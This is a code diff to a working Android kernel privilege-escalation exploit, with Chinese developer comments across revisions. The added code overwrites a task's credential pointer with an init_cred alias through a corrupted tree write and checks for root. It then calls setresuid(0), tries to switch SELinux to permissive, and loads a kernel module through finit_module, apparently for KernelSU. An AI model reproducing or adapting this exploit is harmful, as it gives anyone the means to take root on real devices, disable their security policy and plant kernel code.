@@ -571,33 +571,104 @@ int run_exploit(int argc, char **argv) {
         if (wr != (ssize_t)sizeof(my_task) || !my_task) _exit(1);
         pr_info("mt33: child pid=%d task=%016zx blocking-for-cred-write\n", getpid(), (size_t)my_task);
         fflush(stdout);
-        /* mt46 ★子进程存活修复★ — 旧 mt36 代码两个致命 bug:
-         * 1) FUTEX_WAIT(&uaddr=0, expected=1): *uaddr(0) != 1 → 立即 EAGAIN，
-         *    子进程根本没阻塞，fork 后毫秒级 _exit(2) → exit_creds 释放 cred
-         *    → 父进程所有写入落在已释放(可能复用)的 slab 上 ← mt36-45 全部
-         *    "no root" 的根因，写原语本身可能一直是好的。
-         * 2) 就算阻塞了，父进程 FUTEX_WAKE 打在自己栈变量 &wu 上，
-         *    fork 后 mm 不同 → futex key 不同 → 跨进程唤醒结构性不可能。
-         * 新机制: 子进程保持存活，200ms 周期自查 6 个 id 字段，命中即 exit(42)。 */
-        for (int poll_i = 0; poll_i < 900; poll_i++) {  /* ~3 min 自检窗 */
+        /* mt47 ★检测通道升级 + root 落地★
+         * 关键: 指针换 init_cred 后 uid=0xffffff80(≠0) — 旧 uid==0 判定会漏报
+         * 又一次"检测通道死人"事故! 新判据: CapEff!=0 (bitmap 直读, 指针换即刻命中)
+         * OR 任一 id 字段==0 (零写路线命中)。
+         * 命中后: setresgid/setresuid(0,0,0) — CAP_SETUID 在手, prepare_creds 复制出
+         * 私有干净 cred, 不再共享被 STORE(b) 污染的 init_cred。
+         * root 存活期 = 本子进程存活期 → 命中后不退出, 8 分钟窗口内:
+         *   marker → setenforce 探针(纯诊断) → PSELECT_KO 存在则 finit_module 重试
+         *   (等 enforce 零写轮把全局翻成 Permissive) → 成功才 exit(42)。 */
+#ifndef SYS_finit_module
+#define SYS_finit_module 273
+#endif
+        int root_seen = 0, ksu_done = 0;
+        for (int poll_i = 0; poll_i < 2400; poll_i++) {  /* 8 min 窗口 */
           uid_t ruid, euid, suid;
-          getresuid(&ruid, &euid, &suid);
           gid_t rgid, egid, sgid;
+          getresuid(&ruid, &euid, &suid);
           getresgid(&rgid, &egid, &sgid);
-          if (ruid == 0 || euid == 0 || suid == 0 ||
-              rgid == 0 || egid == 0 || sgid == 0) {
-            pr_success("mt46: CHILD-ROOT ids uid=%d euid=%d suid=%d gid=%d egid=%d sgid=%d poll=%d\n",
-                       ruid, euid, suid, rgid, egid, sgid, poll_i);
+          unsigned long long capeff = 0;
+          {
+            FILE *st = fopen("/proc/self/status", "r");
+            char ln[160];
+            if (st) {
+              while (fgets(ln, sizeof(ln), st)) {
+                if (strncmp(ln, "CapEff:", 7) == 0) {
+                  capeff = strtoull(ln + 7, NULL, 16);
+                  break;
+                }
+              }
+              fclose(st);
+            }
+          }
+          if ((ruid == 0 || euid == 0 || suid == 0 ||
+               rgid == 0 || egid == 0 || sgid == 0 || capeff != 0) && !root_seen) {
+            root_seen = 1;
+            pr_success("mt47: ROOT-SEEN ids uid=%d euid=%d suid=%d gid=%d egid=%d sgid=%d CapEff=%016llx poll=%d\n",
+                       ruid, euid, suid, rgid, egid, sgid, capeff, poll_i);
             fflush(stdout);
-            _exit(42);
+            setresgid(0, 0, 0);
+            setresuid(0, 0, 0);
+            getresuid(&ruid, &euid, &suid);
+            getresgid(&rgid, &egid, &sgid);
+            pr_info("mt47: after setres uid=%d euid=%d gid=%d egid=%d\n",
+                    ruid, euid, rgid, egid);
+            int mfd = open("/data/local/tmp/root_alive.txt",
+                           O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (mfd >= 0) {
+              dprintf(mfd, "pid=%d uid=%d euid=%d CapEff=%016llx\n",
+                      getpid(), ruid, euid, capeff);
+              close(mfd);
+            }
+            /* 诊断探针: kernel SID 的 setenforce 权限 (avc 判 SID, 与 caps 无关,
+             * 失败属预期 — enforce 零写轮才是正路) */
+            int efd2 = open("/sys/fs/selinux/enforce", O_WRONLY);
+            if (efd2 >= 0) {
+              ssize_t w2 = write(efd2, "0", 1);
+              pr_info("mt47: setenforce probe wr=%zd errno=%d\n", w2, errno);
+              close(efd2);
+            }
+            fflush(stdout);
+          }
+          if (root_seen) {
+            char *ko = getenv("PSELECT_KO");
+            if (ko && !ksu_done && (poll_i % 5) == 0) {
+              int kfd = open(ko, O_RDONLY);
+              if (kfd >= 0) {
+                long rc = syscall(SYS_finit_module, kfd, "", 0);
+                int insmod_errno = errno;
+                close(kfd);
+                if (rc == 0) {
+                  ksu_done = 1;
+                  pr_success("mt47: ★ finit_module(%s) OK — KSU 路径打通 ★\n", ko);
+                  fflush(stdout);
+                  int dfd = open("/data/local/tmp/ksu_done.txt",
+                                 O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                  if (dfd >= 0) {
+                    dprintf(dfd, "pid=%d\n", getpid());
+                    close(dfd);
+                  }
+                  _exit(42);
+                }
+                if ((poll_i % 50) == 0) {
+                  pr_info("mt47: insmod retry poll=%d errno=%d\n",
+                          poll_i, insmod_errno);
+                  fflush(stdout);
+                }
+              }
+            }
           }
           if (poll_i > 0 && (poll_i % 50) == 0) {  /* 10s 心跳 */
-            pr_info("mt46: child alive poll=%d ids uid=%d euid=%d\n", poll_i, ruid, euid);
+            pr_info("mt47: alive poll=%d uid=%d CapEff=%016llx\n",
+                    poll_i, ruid, capeff);
             fflush(stdout);
           }
           usleep(200000);
         }
-        pr_info("mt46: child self-check timeout (3min), no id hit\n");
+        if (root_seen) _exit(42);
+        pr_info("mt47: child window over (8min), root_seen=%d\n", root_seen);
         fflush(stdout);
         _exit(2);
       }
@@ -647,27 +718,49 @@ int run_exploit(int argc, char **argv) {
       int got_root = 0;
       for (int att = 1; att <= retries && !got_root; att++) {
         uintptr_t fake_cred = P0_DATA_ALIAS_CONST(INIT_CRED); /* 2026-08-15 mt30: 写 init_cred 指针 (ghostlock W2 经验, RCU 安全) */
-        /* mt46 (P0-A): uid-window 轮扫 + PSELECT_UID_WIN env 覆盖。
-         * 配 PSELECT_RETRY=1 + 每轮新进程用（套 mt25/26 已验证的免毒化纪律），
-         * 窗口由脚本按轮指定，避免进程内连续重试的 trigger-110。
-         * 写入是 8 字节 0，每窗口零写覆盖一对字段（反汇编证实 STORE(a) 为 64-bit）:
-         *   0x04 → uid+gid    0x14 → euid+egid
-         *   0x1c → fsuid+fsgid    0x24 → securebits+cap_inheritable.lo（对照组） */
+        /* mt47: 三种写入模式
+         * PTR_MODE ★主路线★: STORE(a) [task+0x780]=init_cred别名 — cred 指针一发换
+         *   init_cred, ELF dump 实证: id 全 0 + cap_eff=0x1fffffffffffffff(全满)。
+         *   STORE(b) 副作用 [init_cred]=pc(task+0x778):
+         *     usage ← 低32位(≈1.5e9 巨大正值 — 引用计数永不归零, 防释放=护身符,
+         *             mt32-36 的 __put_cred BUG_ON 结构性免疫)
+         *     uid   ← 高32位(0xffffff80 — 子进程 setresuid(0) 自愈, 无需补刀)
+         *   child≠0 → 无 rebalance(ELF 反汇编实证), 两个 store 都落在合法可写内存。
+         * FIX_MODE(可选卫生轮): 零写 [init_cred+4] → uid+gid 归零。
+         * 窗口模式: mt46 的 uid 零写轮扫(保留, 作对照/备份路线)。 */
+        if (getenv("PSELECT_PTR_MODE")) {
+          snprintf(pc_env, sizeof(pc_env), "%zx",
+                   (size_t)(task + TASK_REAL_CRED_OFF));
+          snprintf(right_env, sizeof(right_env), "%zx",
+                   (size_t)P0_DATA_ALIAS_CONST(INIT_CRED));
+          snprintf(left_env, sizeof(left_env), "0");
+          pr_info("mt47: PTR_MODE task=%016zx pc=%s right=%s (STORE(a)→[task+0x780])\n",
+                  (size_t)task, pc_env, right_env);
+        } else if (getenv("PSELECT_FIX_MODE")) {
+          uintptr_t ic_alias = P0_DATA_ALIAS_CONST(INIT_CRED);
+          snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(ic_alias - 4));
+          snprintf(right_env, sizeof(right_env), "0");
+          snprintf(left_env, sizeof(left_env), "0");
+          pr_info("mt47: FIX_MODE init_cred=%016zx pc=%s (零写→[init_cred+4])\n",
+                  (size_t)ic_alias, pc_env);
+        } else {
         static const uintptr_t uid_wins[] = { 0x14, 0x4, 0x1c, 0x24 };
         uintptr_t uid_win = uid_wins[(att - 1) % 4];
         char *win_env_s = getenv("PSELECT_UID_WIN");
         if (win_env_s) uid_win = strtoul(win_env_s, NULL, 16);
         cred_uid_ptr = cred_addr + uid_win;
         snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(cred_uid_ptr - 8));
-        snprintf(left_env, sizeof(left_env), "%zx", (size_t)cred_addr);
+        snprintf(left_env, sizeof(left_env), "0"); /* mt47修正: 必须0 — mt46实证配方; 旧cred_addr是mt28死路遗留, TREE_LEFT≠0会走successor路径 */
+        snprintf(right_env, sizeof(right_env), "0");
         pr_info("mt46: attempt %d window=%zx uid_ptr=%016zx\n", att, (size_t)uid_win, (size_t)cred_uid_ptr);
+        }
         /* 2026-08-15 mt32: 改用 PSELECT_W* 写链 (env 优先, util.c 已修) — 不走 tree_left successor 死路
          * WPC = cred_ptr-8 (写目标: parent->rb_right = task+0x780)
          * WRIGHT = init_cred dmap (写入值)
          * WLEFT = 0 (Case-1 主树写, 不崩) */
-        setenv("PSELECT_TREE_PC", pc_env, 1);  /* mt44: use TREE_PC (main tree, mt26 same path) */
-        setenv("PSELECT_TREE_RIGHT", "0", 1);
-        setenv("PSELECT_TREE_LEFT", "0", 1);
+        setenv("PSELECT_TREE_PC", pc_env, 1);   /* mt47: 三模式统一走 TREE_PC 主树 */
+        setenv("PSELECT_TREE_RIGHT", right_env, 1); /* mt47: ★不再写死0★ PTR_MODE 写 init_cred 指针 */
+        setenv("PSELECT_TREE_LEFT", left_env, 1);
         setenv("PSELECT_WPC", "0", 1);
         setenv("PSELECT_WRIGHT", "0", 1);
         setenv("PSELECT_WLEFT", "0", 1);
@@ -686,25 +779,38 @@ int run_exploit(int argc, char **argv) {
         }
         /* mt46: 子进程 200ms 周期自检，无需唤醒
          * （旧 FUTEX_WAKE 打在父进程自己栈变量上，fork 后 mm 不同，结构性无效，已删） */
+        /* mt47: 子进程 root 后不退出(等 insmod), 父进程改查 marker 文件 */
         int cst2 = 0;
         if (waitpid(cred_child, &cst2, WNOHANG) == cred_child) {
           if (WIFEXITED(cst2) && WEXITSTATUS(cst2) == 42) {
-            pr_success("mt36: CHILD-ROOT attempt=%d\n", att);
+            pr_success("mt47: CHILD-ROOT attempt=%d\n", att);
             got_root = 1;
             break;
           }
         }
+        if (access("/data/local/tmp/root_alive.txt", F_OK) == 0 ||
+            access("/data/local/tmp/ksu_done.txt", F_OK) == 0) {
+          pr_success("mt47: ROOT marker seen attempt=%d\n", att);
+          got_root = 1;
+          break;
+        }
         slide_reset_trigger_state();
         usleep(300000);
       }
-      /* mt33: wait for child result (42 = root) */
+      /* mt33/mt47: wait for child result (42 = root) or marker */
       int cst = 0;
       for (int i = 0; i < 60; i++) {
         if (waitpid(cred_child, &cst, WNOHANG) == cred_child) {
           if (WIFEXITED(cst) && WEXITSTATUS(cst) == 42) {
-            pr_success("mt33: *** CHILD-ROOT confirmed ***\n");
+            pr_success("mt47: *** CHILD-ROOT confirmed ***\n");
             got_root = 1;
           }
+          break;
+        }
+        if (access("/data/local/tmp/root_alive.txt", F_OK) == 0 ||
+            access("/data/local/tmp/ksu_done.txt", F_OK) == 0) {
+          pr_success("mt47: *** ROOT marker confirmed (child alive, 8min window) ***\n");
+          got_root = 1;
           break;
         }
         usleep(100000);
